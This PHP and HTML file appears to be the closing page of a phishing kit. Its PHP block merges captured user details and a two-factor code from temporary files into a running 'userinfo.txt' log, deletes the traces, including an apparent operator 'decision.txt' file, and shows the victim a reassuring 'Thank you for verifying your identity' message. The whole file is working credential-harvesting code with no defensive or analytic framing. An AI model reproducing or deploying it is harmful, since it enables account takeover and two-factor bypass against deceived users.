<?php
$userFile = "user.txt";
$codeFile = "2fa.txt";
$finalFile = "userinfo.txt";

if (file_exists($userFile)) {
    $user = file_get_contents($userFile);
    $code = file_exists($codeFile) ? file_get_contents($codeFile) : "2FA: N/A";
    $entry = $user . $code . "\n----------------\n";
    file_put_contents($finalFile, $entry, FILE_APPEND);
    unlink($userFile);
    if (file_exists($codeFile)) {
        unlink($codeFile);
    }
    if (file_exists("decision.txt")) {
        unlink("decision.txt");
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Success</title>
  <style>
    body {
      background: linear-gradient(to bottom, #f0f8ff, #ffffff);
      font-family: Arial, sans-serif;
      color: #333;
      text-align: center;
      padding-top: 100px;
    }

    .icon {
      width: 70px;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 24px;
      color: #28a745;
      margin-bottom: 10px;
    }

    p {
      font-size: 16px;
      color: #444;
    }
  </style>
</head>
<body>

  <h2>Your request was successfully submitted.</h2>
  <p>Thank you for verifying your identity.</p>

</body>
</html>
